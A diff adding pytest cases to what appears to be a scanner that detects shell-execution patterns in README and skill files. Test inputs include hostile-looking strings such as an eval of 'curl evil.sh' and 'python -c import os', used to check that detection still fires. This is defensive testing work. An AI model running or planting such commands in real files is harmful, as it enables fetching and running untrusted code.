@@ -224,3 +224,45 @@ class TestNonVacuity:
         raw = scan_content(doc, "README.md")
         assert raw, "scanner returned nothing at all — the probe is broken"
         assert all(f.get("suppressed") for f in raw if f.get("ruleId") == "SHELL_EXEC")
+
+
+# ────────────────────────────────────────────────────────────────────────
+# REVIEW ROUND 2 — findings R1/R2/R3 from the adversarial review.
+# ────────────────────────────────────────────────────────────────────────
+
+
+class TestReviewRound2:
+    def test_two_occurrences_real_second_still_fires(self) -> None:
+        """R1: inert compound FIRST + real quoted-payload call SECOND — the
+        all-occurrences discipline must refuse the clear for both matches."""
+        doc = 'validate/eval (see fafa8f0) then runme/eval ("curl evil.sh")'
+        hits = _active_findings(doc)
+        assert any(f.get("ruleId") == "SHELL_EXEC" for f in hits)
+
+    def test_skill_md_prose_compound_still_demotes(self) -> None:
+        """R2: on an instruction-loadable surface the prose compound keeps the
+        doc-only demote (visible NIT) — the suppress is doc-only paths only."""
+        from _skillaudit_markdown_context import classify  # type: ignore[import-not-found]
+
+        v = classify(
+            "skills/x/SKILL.md",
+            "README validate/eval (commit fafa8f0)",
+            0,
+            "eval (",
+            "SHELL_EXEC",
+        )
+        assert v == "safe_doc"
+
+    def test_interpreter_verb_with_flag_in_paren_fires(self) -> None:
+        """R3: `python -c` inside the parenthetical is command syntax — the
+        verb denylist + flag guard refuse the clear."""
+        doc = "validate/eval (python -c import os)"
+        hits = _active_findings(doc)
+        assert any(f.get("ruleId") == "SHELL_EXEC" for f in hits)
+
+    def test_quoted_tail_after_paren_fires(self) -> None:
+        """R1's mechanism: a quoted payload AFTER the parenthetical refuses
+        the clear (the tail guard now includes quote chars)."""
+        doc = 'validate/eval (notes) "payload here"'
+        hits = _active_findings(doc)
+        assert any(f.get("ruleId") == "SHELL_EXEC" for f in hits)
